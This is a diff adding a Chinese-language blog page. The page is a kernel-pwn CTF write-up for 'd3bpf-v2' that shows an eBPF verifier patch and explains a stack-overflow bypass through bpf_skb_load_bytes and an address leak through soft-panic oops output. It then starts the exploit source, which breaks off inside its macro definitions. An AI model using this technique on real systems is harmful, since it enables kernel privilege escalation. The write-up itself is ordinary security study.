@@ -1,0 +1,561 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="196082">
+    
+    <title>
+        
+            d3bpf-v2 |
+        
+        196082&#39;s blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="shortcut icon" href="/images/ufo.ico">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/css/font-awesome.min.css">
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"cv196082.gitee.io","root":"/","language":"zh-CN","path":"search.json"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066CC","avatar":"/images/ai.jpg","favicon":"/images/ufo.ico","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":true,"scale":true},"first_screen":{"enable":false,"background_img":"/images/bg.svg","description":"Keep writing and Keep loving."},"scroll":{"progress_bar":{"enable":false},"percent":{"enable":false}}},"local_search":{"enable":true,"preload":true},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":true},"version":"3.4.3"};
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 月前","year":"%s 年前"};
+  </script>
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="196082's blog" type="application/atom+xml">
+</head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            <header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                196082&#39;s blog
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                首页
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                归档
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/categories"
+                            >
+                                分类
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/tags"
+                            >
+                                标签
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">首页</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">归档</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories">分类</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/tags">标签</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            <span class="title-hover-animation">d3bpf-v2</span>
+        </div>
+
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/images/ai.jpg">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">196082</span>
+                        
+                            <span class="author-label">切勿浮躁,绝不摆烂!</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-edit"></i>&nbsp;2023-01-11 18:09:05
+    </span>
+    
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/categories/kernel-pwn/">kernel-pwn</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/ebpf/">ebpf</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fas fa-file-word"></i>&nbsp;<span>1.9k 字</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fas fa-clock"></i>&nbsp;<span>10 分钟</span>
+        </span>
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        <div class="article-content markdown-body">
+            <p>因为近期一直在玩内核，在把这篇文章写完之后就不会一直更新内核相关的了，后续的打算是学习完逃逸的内容之后就开始进行刷题和复现比赛的练习了。</p>
+<h2 id="分析题目"><a href="#分析题目" class="headerlink" title="分析题目"></a>分析题目</h2><p>首先，这道题的大致跟上一道题目一样，存在一个patch</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/kernel/bpf/verifier.c b/kernel/bpf/verifier.c</span><br><span class="line">index <span class="number">40</span>d92628e..be9cdde7a <span class="number">100644</span></span><br><span class="line">--- a/kernel/bpf/verifier.c</span><br><span class="line">+++ b/kernel/bpf/verifier.c</span><br><span class="line">@@ <span class="number">-8100</span>,<span class="number">11</span> +<span class="number">8100</span>,<span class="number">11</span> @@ <span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">adjust_scalar_min_max_vals</span><span class="params">(struct bpf_verifier_env *env,</span></span></span><br><span class="line"><span class="params"><span class="function"> 			scalar_min_max_lsh(dst_reg, &amp;src_reg);</span></span></span><br><span class="line"><span class="params"><span class="function"> 		<span class="keyword">break</span>;</span></span></span><br><span class="line"><span class="params"><span class="function"> 	<span class="keyword">case</span> BPF_RSH:</span></span></span><br><span class="line"><span class="params"><span class="function">-		<span class="keyword">if</span> (umax_val &gt;= insn_bitness) &#123;</span></span></span><br><span class="line"><span class="params"><span class="function">-			<span class="comment">/* Shifts greater than 31 or 63 are undefined.</span></span></span></span><br><span class="line"><span class="comment"><span class="params"><span class="function">-			 * This includes shifts by a negative number.</span></span></span></span><br><span class="line"><span class="comment"><span class="params"><span class="function">-			 */</span></span></span></span><br><span class="line"><span class="params"><span class="function">-			mark_reg_unknown(env, regs, insn-&gt;dst_reg);</span></span></span><br><span class="line"><span class="params"><span class="function">+		<span class="keyword">if</span> (umin_val &gt;= insn_bitness) &#123;</span></span></span><br><span class="line"><span class="params"><span class="function">+			<span class="keyword">if</span> (alu32)</span></span></span><br><span class="line"><span class="params"><span class="function">+				__mark_reg32_known(dst_reg, <span class="number">0</span>);</span></span></span><br><span class="line"><span class="params"><span class="function">+			<span class="keyword">else</span></span></span></span><br><span class="line"><span class="params"><span class="function">+				__mark_reg_known_zero(dst_reg);</span></span></span><br><span class="line"><span class="params"><span class="function"> 			<span class="keyword">break</span>;</span></span></span><br><span class="line"><span class="params"><span class="function"> 		&#125;</span></span></span><br><span class="line"><span class="params"><span class="function"> 		<span class="keyword">if</span> (alu32)</span></span></span><br><span class="line"><span class="params"><span class="function"></span></span></span><br></pre></td></tr></table></figure>
+
+<p>可以看出来这里的patch跟前面一道题一样，在RSH中设置了超过指定大小的数时会设置为known的0。</p>
+<p>不同的是这里题目使用的内核版本是5.16.12+，而在新版本的内核中存在新的检测机制：</p>
+<ul>
+<li>  任何指针只能进行加减操作，不能进行比较（防止侧信道）</li>
+<li>  在进行指针与寄存器操作时，verfier会将已知的寄存器替换为常数进行计算。</li>
+</ul>
+<p>所以这也就造成了前面的攻击手法无效了。</p>
+<h2 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h2><p>这里出现了一个新的函数<code>bpf_skb_load_bytes</code>可以进行绕过</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">BPF_CALL_4(bpf_skb_load_bytes, <span class="keyword">const</span> struct sk_buff *, skb, u32, offset,</span><br><span class="line">	   <span class="keyword">void</span> *, to, u32, len)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">void</span> *ptr;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(offset &gt; <span class="number">0xffff</span>))</span><br><span class="line">		<span class="keyword">goto</span> err_clear;</span><br><span class="line"></span><br><span class="line">	ptr = skb_header_pointer(skb, offset, len, to);</span><br><span class="line">	<span class="keyword">if</span> (unlikely(!ptr))</span><br><span class="line">		<span class="keyword">goto</span> err_clear;</span><br><span class="line">	<span class="keyword">if</span> (ptr != to)</span><br><span class="line">		<span class="built_in">memcpy</span>(to, ptr, len);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">err_clear:</span><br><span class="line">	<span class="built_in">memset</span>(to, <span class="number">0</span>, len);</span><br><span class="line">	<span class="keyword">return</span> -EFAULT;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个函数的作用是读取socket缓冲区到指定的位置，在ebpf程序中可以是栈或者map。</p>
+<p>然而因为patch的缘故我们可以很轻松的实现栈溢出。</p>
+<h3 id="泄漏地址"><a href="#泄漏地址" class="headerlink" title="泄漏地址"></a>泄漏地址</h3><p>这里leak的方法延用作者的方法。</p>
+<p>在新版本内核中ebpf程序crash并不会造成内核的崩溃，当<code>/proc/sys/kernel/panic_on_oops</code> 值为 0 时 <code>soft panic</code> 并不会直接 panic。似乎在默认情况下其值就是 0，如 Ubuntu20.04。而在kernel pwn题目中想出现上述情况的方法是在qemu启动项中添加<code> oops = panic</code>。而在发生<code>soft panic</code>时会打印出来内核地址。所以这里选择这样使用，使ebpf程序出现crash紧接着就会打印出地址即可。</p>
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>这里因为可以很简单的进行栈溢出所以就不多赘述了。所以直接给出exp</p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/if.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf_common.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> _BPF_DEFS_H_</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _BPF_DEFS_H_</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_RAW_INSN(CODE, DST, SRC, OFF, IMM) \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                        \</span></span><br><span class="line"><span class="meta">        .code = CODE,                          \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                        \</span></span><br><span class="line"><span class="meta">        .src_reg = SRC,                        \</span></span><br><span class="line"><span class="meta">        .off = OFF,                            \</span></span><br><span class="line"><span class="meta">        .imm = IMM&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_LD_IMM64_RAW(DST, SRC, IMM)              \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                              \</span></span><br><span class="line"><span class="meta">        .code = BPF_LD | BPF_DW | BPF_IMM,           \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                              \</span></span><br><span class="line"><span class="meta">        .src_reg = SRC,                              \</span></span><br><span class="line"><span class="meta">        .off = 0,                                    \</span></span><br><span class="line"><span class="meta">        .imm = (__u32)(IMM)&#125;),                       \</span></span><br><span class="line"><span class="meta">        ((struct bpf_insn)&#123;                          \</span></span><br><span class="line"><span class="meta">            .code = 0, <span class="comment">/* zero is reserved opcode */</span> \</span></span><br><span class="line"><span class="meta">            .dst_reg = 0,                            \</span></span><br><span class="line"><span class="meta">            .src_reg = 0,                            \</span></span><br><span class="line"><span class="meta">            .off = 0,                                \</span></span><br><span class="line"><span class="meta">            .imm = ((__u64)(IMM)) &gt;&gt; 32&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Memory load, dst_reg = *(uint *) (src_reg + off16) */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_LDX_MEM(SIZE, DST, SRC, OFF)            \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                             \</span></span><br><span class="line"><span class="meta">        .code = BPF_LDX | BPF_SIZE(SIZE) | BPF_MEM, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                             \</span></span><br><span class="line"><span class="meta">        .src_reg = SRC,                             \</span></span><br><span class="line"><span class="meta">        .off = OFF,                                 \</span></span><br><span class="line"><span class="meta">        .imm = 0&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Memory store, *(uint *) (dst_reg + off16) = src_reg */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_STX_MEM(SIZE, DST, SRC, OFF)            \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                             \</span></span><br><span class="line"><span class="meta">        .code = BPF_STX | BPF_SIZE(SIZE) | BPF_MEM, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                             \</span></span><br><span class="line"><span class="meta">        .src_reg = SRC,                             \</span></span><br><span class="line"><span class="meta">        .off = OFF,                                 \</span></span><br><span class="line"><span class="meta">        .imm = 0&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Conditional jumps against immediates, if (dst_reg &#x27;op&#x27; imm32) goto pc + off16 */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_JMP_IMM(OP, DST, IMM, OFF)        \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                       \</span></span><br><span class="line"><span class="meta">        .code = BPF_JMP | BPF_OP(OP) | BPF_K, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                       \</span></span><br><span class="line"><span class="meta">        .src_reg = 0,                         \</span></span><br><span class="line"><span class="meta">        .off = OFF,                           \</span></span><br><span class="line"><span class="meta">        .imm = IMM&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Like BPF_JMP_IMM, but with 32-bit wide operands for comparison. */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_JMP32_IMM(OP, DST, IMM, OFF)        \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                         \</span></span><br><span class="line"><span class="meta">        .code = BPF_JMP32 | BPF_OP(OP) | BPF_K, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                         \</span></span><br><span class="line"><span class="meta">        .src_reg = 0,                           \</span></span><br><span class="line"><span class="meta">        .off = OFF,                             \</span></span><br><span class="line"><span class="meta">        .imm = IMM&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Short form of mov, dst_reg = imm32 */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_MOV64_IMM(DST, IMM)              \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                      \</span></span><br><span class="line"><span class="meta">        .code = BPF_ALU64 | BPF_MOV | BPF_K, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                      \</span></span><br><span class="line"><span class="meta">        .src_reg = 0,                        \</span></span><br><span class="line"><span class="meta">        .off = 0,                            \</span></span><br><span class="line"><span class="meta">        .imm = IMM&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_MOV32_IMM(DST, IMM)            \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                    \</span></span><br><span class="line"><span class="meta">        .code = BPF_ALU | BPF_MOV | BPF_K, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                    \</span></span><br><span class="line"><span class="meta">        .src_reg = 0,                      \</span></span><br><span class="line"><span class="meta">        .off = 0,                          \</span></span><br><span class="line"><span class="meta">        .imm = IMM&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Short form of mov, dst_reg = src_reg 